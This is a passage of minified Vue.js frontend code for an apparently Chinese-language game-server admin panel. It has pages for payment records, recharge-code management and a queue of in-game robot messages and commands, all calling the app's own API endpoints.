0},userChargeListColumns:[{title:"用户",key:"userName",dataIndex:"userName",width:180,align:"center",scopedSlots:{customRender:"userName"}},{title:"充值金额",key:"chargeMoney",dataIndex:"chargeMoney",width:80,align:"center",scopedSlots:{customRender:"chargeMoney"}},{title:"对应美金数额",key:"dollar",dataIndex:"dollar",width:100,align:"center",scopedSlots:{customRender:"dollar"}},{title:"支付平台流水号",key:"tradeNo",dataIndex:"tradeNo",width:180,align:"center",scopedSlots:{customRender:"tradeNo"}},{title:"订单号",key:"outTradeNo",dataIndex:"outTradeNo",width:180,align:"center",scopedSlots:{customRender:"outTradeNo"}},{title:"支付平台",key:"payType",dataIndex:"payType",width:100,align:"center",scopedSlots:{customRender:"payType"}},{title:"类型",key:"type",dataIndex:"type",width:120,align:"center",scopedSlots:{customRender:"type"}},{title:"状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"是否已经提现",key:"withdrawn",dataIndex:"withdrawn",width:80,align:"center",scopedSlots:{customRender:"withdrawn"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],userChargeListData:[],userChargeListPagination:{pageSize:20,pageNum:1,total:0}}},mounted:function(){this.getUserChargeList()},methods:{onUserChargeListCleanFilter:function(){var e=this;this.userChargeListPagination.pageNum=1,this.$nextTick((function(){e.getUserChargeList(!0)}))},onUserChargeListFilter:function(){var e=this;this.userChargeListPagination.pageNum=1,this.$nextTick((function(){e.getUserChargeList()}))},onChangeUserChargeListPagination:function(e){var t=this;this.userChargeListPagination.pageNum=e,this.$nextTick((function(){t.getUserChargeList()}))},onShowSizeChangeUserChargeListPagination:function(e,t){var i=this;this.userChargeListPagination.pageNum=1,this.userChargeListPagination.pageSize=t,this.$nextTick((function(){i.getUserChargeList()}))},getUserChargeList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.userChargeListPagination,n=a.pageNum,r=a.pageSize,e?(t.userChargeListFilter={userName:void 0,status:void 0,chargeMoney:void 0,dollar:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.userChargeListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingUserChargeListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/userChargeAdminSys/list",params:o});case 6:c=i.sent,t.loadingUserChargeListTable=!1,200===c.status&&(t.userChargeListPagination.total=c.data.count,t.userChargeListData=c.data.list),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingUserChargeListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},deleteFailBefore7D:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"DELETE",url:"/userChargeAdminSys/deleteFailBefore7D"});case 3:200===t.sent.status&&(e.$message.success("操作成功"),e.onUserChargeListCleanFilter()),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},dt=ct,ut=Object(S.a)(dt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"支付管理"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[i("a-popconfirm",{attrs:{title:"确定要清空七天前的未支付记录吗"},on:{confirm:e.deleteFailBefore7D}},[i("a-button",{attrs:{icon:"delete",size:"small",type:"danger"}},[e._v("清空七天前的未支付记录")])],1)],1):e._e()]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUserChargeListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUserChargeListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("用户昵称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:e.userChargeListFilter.userName,callback:function(t){e.$set(e.userChargeListFilter,"userName",t)},expression:"userChargeListFilter.userName"}}),i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("充值订单状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"请选择",allowClear:""},model:{value:e.userChargeListFilter.status,callback:function(t){e.$set(e.userChargeListFilter,"status",t)},expression:"userChargeListFilter.status"}},e._l(e.userChargeStatusList,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("充值数额:")]),i("a-input-number",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"请输入",allowClear:""},model:{value:e.userChargeListFilter.chargeMoney,callback:function(t){e.$set(e.userChargeListFilter,"chargeMoney",t)},expression:"userChargeListFilter.chargeMoney"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("对应美金:")]),i("a-input-number",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{min:0,placeholder:"请输入",allowClear:""},model:{value:e.userChargeListFilter.dollar,callback:function(t){e.$set(e.userChargeListFilter,"dollar",t)},expression:"userChargeListFilter.dollar"}}),i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.userChargeListFilter.timestampStart,e.userChargeListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.userChargeListFilter,"timestampStart",t[0]),e.$set(e.userChargeListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.userChargeListColumns,"data-source":e.userChargeListData,"row-key":"id",pagination:!1,loading:e.loadingUserChargeListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"userName",fn:function(t,a){return[a.user&&a.user.id?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.user.userName}})}}},[e._v(" "+e._s(a.user.userName)+" ")]):i("span",[e._v(e._s(a.userId))])]}},{key:"chargeMoney",fn:function(t){return[i("span",[e._v(e._s(t)+"元")])]}},{key:"money",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"outTradeNo",fn:function(t,a){return[i("span",[e._v(e._s(a.outTradeNo||"-"))])]}},{key:"tradeNo",fn:function(t,a){return[i("span",[e._v(e._s(a.tradeNo||"-"))])]}},{key:"payType",fn:function(t){return[i("span",[e._v(e._s(e.payTypeEnum[t]||t||"-"))])]}},{key:"type",fn:function(t,a){return[e._v(" "+e._s(e.chargeDollarTypeList[t])+" "),"complex"===t?i("span",[e._v("("+e._s(a.configs.desc||a.configs.typeGroup)+")")]):e._e()]}},{key:"status",fn:function(t){return[e.userChargeStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.userChargeStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(t&&e.userChargeStatusList[t]?e.userChargeStatusList[t]:""))])]}},{key:"withdrawn",fn:function(t){return[i("span",[e._v(e._s(t?"是":"否"))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.userChargeListPagination.pageSize,current:e.userChargeListPagination.pageNum,total:e.userChargeListPagination.total},on:{change:e.onChangeUserChargeListPagination,showSizeChange:e.onShowSizeChangeUserChargeListPagination}})],1)])],1)}),[],!1,null,"b5456eae",null),pt=ut.exports,mt={name:"ChargeDollar",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{banLoading:!1,moment:R.a,chargeDollarStatusList:{created:"已创建",used:"已使用",banned:"已失效"},chargeDollarStatusBadgeKeyValue:{created:"processing",used:"success",banned:"default"},showAddChargeDollarItemModal:!1,addChargeDollarItemLoading:!1,addChargeDollarItemForm:{dollar:null,number:1,expireTimeStamp:null},addChargeDollarItemRules:{dollar:[{required:!0,trigger:"change",message:"金额不能为空(>=0)",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("金额不能为空"))}}],number:[{required:!0,trigger:"change",message:"数量不能为空(>=1)",validator:function(e,t,i){"number"==typeof t&&t>=1?i():i(new Error("数量不能为空"))}}]},loadingChargeDollarListTable:!1,chargeDollarListFilter:{userName:void 0,status:void 0,secretKey:void 0,dollar:void 0,timestampStart:void 0,timestampEnd:void 0},chargeDollarListColumns:[{title:"充值码",key:"secretKey",dataIndex:"secretKey",width:180,align:"center",scopedSlots:{customRender:"secretKey"}},{title:"金额",key:"dollar",dataIndex:"dollar",width:120,align:"center",scopedSlots:{customRender:"dollar"}},{title:"状态",key:"status",dataIndex:"status",width:120,align:"center",scopedSlots:{customRender:"status"}},{title:"创建用户",key:"createdUserName",dataIndex:"createdUserName",width:120,align:"center",scopedSlots:{customRender:"createdUserName"}},{title:"使用用户",key:"userName",dataIndex:"userName",width:120,align:"center",scopedSlots:{customRender:"userName"}},{title:"有效截至时间",key:"expireTimeStamp",dataIndex:"expireTimeStamp",width:150,align:"center",scopedSlots:{customRender:"expireTimeStamp"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],chargeDollarListData:[],chargeDollarListPagination:{pageSize:20,pageNum:1,total:0}}},mounted:function(){this.getChargeDollarList()},methods:{onChargeDollarListCleanFilter:function(){var e=this;this.chargeDollarListPagination.pageNum=1,this.$nextTick((function(){e.getChargeDollarList(!0)}))},onChargeDollarListFilter:function(){var e=this;this.chargeDollarListPagination.pageNum=1,this.$nextTick((function(){e.getChargeDollarList()}))},onChangeChargeDollarListPagination:function(e){var t=this;this.chargeDollarListPagination.pageNum=e,this.$nextTick((function(){t.getChargeDollarList()}))},onShowSizeChangeChargeDollarListPagination:function(e,t){var i=this;this.chargeDollarListPagination.pageNum=1,this.chargeDollarListPagination.pageSize=t,this.$nextTick((function(){i.getChargeDollarList()}))},getChargeDollarList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.chargeDollarListPagination,n=a.pageNum,r=a.pageSize,e?(t.chargeDollarListFilter={userName:void 0,status:void 0,secretKey:void 0,dollar:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.chargeDollarListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingChargeDollarListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/chargeDollarAdminSys/list",params:o});case 6:c=i.sent,t.loadingChargeDollarListTable=!1,200===c.status&&(t.chargeDollarListPagination.total=c.data.count,t.chargeDollarListData=c.data.list),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingChargeDollarListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},banChargeDollar:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.banLoading=!0,t.next=4,f({method:"POST",url:"/chargeDollarAdminSys/banAll"});case 4:200===t.sent.status&&(e.banLoading=!1,e.$message.success("操作成功"),e.getChargeDollarList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.banLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()},submitAddChargeDollarItem:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.addChargeDollarItemForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=15;break}return a={dollar:e.addChargeDollarItemForm.dollar,number:e.addChargeDollarItemForm.number,expireTimeStamp:e.addChargeDollarItemForm.expireTimeStamp?parseInt(R()(e.addChargeDollarItemForm.expireTimeStamp).valueOf()):null},e.addChargeDollarItemLoading=!0,t.prev=3,t.next=6,f({method:"POST",url:"/chargeDollarAdminSys/add",data:a});case 6:n=t.sent,e.addChargeDollarItemLoading=!1,200===n.status?(e.$copyText(n.data.secretKey).then((function(t){e.$message.success("添加成功，已复制到剪贴板")}),(function(t){e.$message.warning("添加成功，复制到剪贴板失败"),console.log("添加成功，复制到剪贴板失败：",t)})),e.showAddChargeDollarItemModal=!1,e.addChargeDollarItemLoading=!1,e.addChargeDollarItemForm={dollar:null},e.getChargeDollarList()):(console.log("错误",n),e.$message.error(n.msg)),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.addChargeDollarItemLoading=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},updateChargeDollarItem:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return a.prev=0,a.next=3,f({method:"PUT",url:"/chargeDollarAdminSys/update",data:{secretKey:e,status:t}});case 3:200===(n=a.sent).status?(i.$message.success("修改成功"),i.getChargeDollarList()):(console.log("错误",n),i.$message.error(n.msg)),a.next=10;break;case 7:a.prev=7,a.t0=a.catch(0),console.error(a.t0);case 10:case"end":return a.stop()}}),a,null,[[0,7]])})))()}}},gt=mt,ht=Object(S.a)(gt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"充值码列表"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():[i("a-button",{staticStyle:{"margin-right":"10px"},attrs:{size:"small",icon:"plus",loading:e.banLoading},on:{click:function(t){e.showAddChargeDollarItemModal=!0}}},[e._v("添加充值码")]),i("a-popconfirm",{attrs:{placement:"right",title:"确定要令所有充值码失效吗"},on:{confirm:e.banChargeDollar}},[i("a-button",{attrs:{size:"small",icon:"stop",type:"danger",loading:e.banLoading}},[e._v("作废所有充值码")])],1)],i("a-modal",{attrs:{title:"添加充值码","mask-closable":!1,width:600},on:{cancel:function(){e.addChargeDollarItemForm.dollar=null}},model:{value:e.showAddChargeDollarItemModal,callback:function(t){e.showAddChargeDollarItemModal=t},expression:"showAddChargeDollarItemModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.addChargeDollarItemLoading},on:{click:e.submitAddChargeDollarItem}},[e._v("提交")])],1),e.showAddChargeDollarItemModal?i("a-form-model",{ref:"addChargeDollarItemForm",staticStyle:{"max-width":"500px"},attrs:{model:e.addChargeDollarItemForm,rules:e.addChargeDollarItemRules,"label-col":{span:6},"wrapper-col":{span:18}}},[i("a-form-model-item",{attrs:{label:"等级积分",prop:"dollar"}},[i("a-input-number",{staticStyle:{width:"100%"},attrs:{min:0},model:{value:e.addChargeDollarItemForm.dollar,callback:function(t){e.$set(e.addChargeDollarItemForm,"dollar",t)},expression:"addChargeDollarItemForm.dollar"}})],1),i("a-form-model-item",{attrs:{label:"数量",prop:"number"}},[i("a-input-number",{staticStyle:{width:"100%"},attrs:{min:1},model:{value:e.addChargeDollarItemForm.number,callback:function(t){e.$set(e.addChargeDollarItemForm,"number",t)},expression:"addChargeDollarItemForm.number"}})],1),i("a-form-model-item",{attrs:{label:"有效截至时间",prop:"expireTimeStamp"}},[i("a-date-picker",{staticStyle:{width:"100%"},attrs:{"show-time":{format:"YYYY-MM-DD HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:e.addChargeDollarItemForm.expireTimeStamp,allowClear:""},on:{change:function(t){e.$set(e.addChargeDollarItemForm,"expireTimeStamp",t)}}})],1)],1):e._e()],2)],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onChargeDollarListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onChargeDollarListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("使用用户昵称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:e.chargeDollarListFilter.userName,callback:function(t){e.$set(e.chargeDollarListFilter,"userName",t)},expression:"chargeDollarListFilter.userName"}}),i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("充值码状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.chargeDollarListFilter.status,callback:function(t){e.$set(e.chargeDollarListFilter,"status",t)},expression:"chargeDollarListFilter.status"}},e._l(e.chargeDollarStatusList,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("充值码内容:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:e.chargeDollarListFilter.secretKey,callback:function(t){e.$set(e.chargeDollarListFilter,"secretKey",t)},expression:"chargeDollarListFilter.secretKey"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("等级积分:")]),i("a-input-number",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{min:0,allowClear:""},model:{value:e.chargeDollarListFilter.dollar,callback:function(t){e.$set(e.chargeDollarListFilter,"dollar",t)},expression:"chargeDollarListFilter.dollar"}}),i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.chargeDollarListFilter.timestampStart,e.chargeDollarListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.chargeDollarListFilter,"timestampStart",t[0]),e.$set(e.chargeDollarListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.chargeDollarListColumns,"data-source":e.chargeDollarListData,"row-key":"id",pagination:!1,loading:e.loadingChargeDollarListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"status",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?[e.chargeDollarStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.chargeDollarStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(t&&e.chargeDollarStatusList[t]?e.chargeDollarStatusList[t]:""))])]:i("a-dropdown",[i("span",{staticStyle:{cursor:"pointer"}},[e.chargeDollarStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.chargeDollarStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(t&&e.chargeDollarStatusList[t]?e.chargeDollarStatusList[t]:""))]),i("a-icon",{staticStyle:{"margin-left":"3px",transform:"translateY(1px)","font-size":"13px"},attrs:{type:"down"}})],1),i("a-menu",{attrs:{slot:"overlay"},on:{click:function(t){e.updateChargeDollarItem(a.secretKey,t.key)}},slot:"overlay"},e._l(e.chargeDollarStatusList,(function(t,a){return i("a-menu-item",{key:a},[e._v(e._s(t))])})),1)],1)]}},{key:"createdUserName",fn:function(t,a){return[a.createdUser&&a.createdUser.id?i("span",{staticStyle:{cursor:"pointer",color:"#1890ff"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.createdUser.userName}})}}},[e._v(" "+e._s(a.createdUser.userName)+" ")]):i("span",[e._v("无")])]}},{key:"userName",fn:function(t,a){return[a.chargeDollarUser&&a.chargeDollarUser.id?i("span",{staticStyle:{cursor:"pointer",color:"#1890ff"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.chargeDollarUser.userName}})}}},[e._v(" "+e._s(a.chargeDollarUser.userName)+" ")]):i("span",[e._v("无")])]}},{key:"expireTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.chargeDollarListPagination.pageSize,current:e.chargeDollarListPagination.pageNum,total:e.chargeDollarListPagination.total},on:{change:e.onChangeChargeDollarListPagination,showSizeChange:e.onShowSizeChangeChargeDollarListPagination}})],1)])],1)}),[],!1,null,"588dbba2",null),ft=ht.exports,yt={name:"Queue",components:{CommandsPicker:_e},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{Error:Error,showAddQueueItemModal:!1,addQueueItemLoading:!1,changeRobotChannelLoading:!1,addQueueItemForm:{type:"",commands:"",buyId:""},addQueueItemRules:{type:[{required:!0,trigger:"change",message:"请选择消息类型",validator:function(e,t,i){t&&t.length?i():i(new Error("请选择消息类型"))}}],commands:[{required:!0,trigger:"change",message:"请输入消息/命令",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入消息/命令"))}}]},queueTypeKeyValue:{adminMsg:"管理员消息(优先级No.1)",innerModeMsg:"内置商城专用通知消息(优先级No.2)",buyMsg:"购买发货消息(优先级No.3, 新手套餐优先)",announceMsg:"通知消息",loginMsg:"登录消息",killMsg:"击杀消息",killPunishmentMsg:"击杀惩罚消息",bountyHunterMsg:"赏金猎人相关消息",monitorMsg:"闭路电视相关消息",liquidationMsg:"大清算相关消息",userAchieveGiftMsg:"成就礼包相关消息"},queueStatusKeyValue:{created:"已创建",processed:"正在执行",fullfilled:"执行完毕"},queueStatusBadgeKeyValue:{created:"default",processed:"processing",fullfilled:"success"},moment:R.a,finishLoading:!1,cleanLoading:!1,loadingQueueListTable:!1,queueListFilter:{type:void 0,status:void 0,buyId:void 0,timestampStart:void 0,timestampEnd:void 0},queueListColumns:[{title:"消息内容",key:"commands",dataIndex:"commands",width:250,align:"center",scopedSlots:{customRender:"commands"}},{title:"消息类型",key:"type",dataIndex:"type",width:120,align:"center",scopedSlots:{customRender:"type"}},{title:"消息类型",key:"status",dataIndex:"status",width:120,align:"center",scopedSlots:{customRender:"status"}},{title:"关联购买ID",key:"buyId",dataIndex:"buyId",width:180,align:"center",scopedSlots:{customRender:"buyId"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"更新时间",key:"updateTimeStamp",dataIndex:"updateTimeStamp",width:150,align:"center",scopedSlots:{customRender:"updateTimeStamp"}}],queueListData:[],queueListPagination:{pageSize:20,pageNum:1,total:0},expandedQueueIds:[],changeMultiRobotChannelModal:!1,changeMultiRobotChannelNumber:1,selectedRowKeys:[]}},mounted:function(){this.getQueueList()},methods:{onQueueListCleanFilter:function(){var e=this;this.queueListPagination.pageNum=1,this.$nextTick((function(){e.getQueueList(!0)}))},onQueueListFilter:function(){var e=this;this.queueListPagination.pageNum=1,this.$nextTick((function(){e.getQueueList()}))},onChangeQueueListPagination:function(e){var t=this;this.queueListPagination.pageNum=e,this.$nextTick((function(){t.getQueueList()}))},onShowSizeChangeQueueListPagination:function(e,t){var i=this;this.queueListPagination.pageNum=1,this.queueListPagination.pageSize=t,this.$nextTick((function(){i.getQueueList()}))},getQueueList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.queueListPagination,n=a.pageNum,r=a.pageSize,e?(t.queueListFilter={type:void 0,status:void 0,buyId:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.queueListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingQueueListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/queueAdminSys/list",params:o});case 6:c=i.sent,t.loadingQueueListTable=!1,200===c.status&&(t.queueListPagination.total=c.data.count,t.queueListData=c.data.list,t.selectedRowKeys=[]),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingQueueListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},changeRobotChannel:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n,r;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return n={type:"adminMsg",commands:"solo"===e?"<tab>":"multi"===e?"single"===t?"<tab-1>":"<tab-2>":"<tab-".concat(t,">")},i.changeRobotChannelLoading=!0,a.prev=2,a.next=5,f({method:"POST",url:"/queueAdminSys/addQueue",data:n});case 5:r=a.sent,i.changeRobotChannelLoading=!1,200===r.status?(i.$message.success("添加指令成功"),i.changeRobotChannelLoading=!1,i.getQueueList()):(console.log("错误",r),i.$message.error(r.msg)),a.next=14;break;case 10:a.prev=10,a.t0=a.catch(2),console.error(a.t0),i.addQueueItemLoading=!1;case 14:case"end":return a.stop()}}),a,null,[[2,10]])})))()},submitAddQueueItem:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.addQueueItemForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=16;break}return a={type:e.addQueueItemForm.type,commands:e.addQueueItemForm.commands},"buyMsg"===e.addQueueItemForm.type&&(a.buyId=e.addQueueItemForm.buyId),e.addQueueItemLoading=!0,t.prev=4,t.next=7,f({method:"POST",url:"/queueAdminSys/addQueue",data:a});case 7:n=t.sent,e.addQueueItemLoading=!1,200===n.status?(e.$message.success("添加成功"),e.showAddQueueItemModal=!1,e.addQueueItemLoading=!1,e.addQueueItemForm={type:"",commands:"",buyId:""},e.getQueueList()):(console.log("错误",n),e.$message.error(n.msg)),t.next=16;break;case 12:t.prev=12,t.t0=t.catch(4),console.error(t.t0),e.addQueueItemLoading=!1;case 16:case"end":return 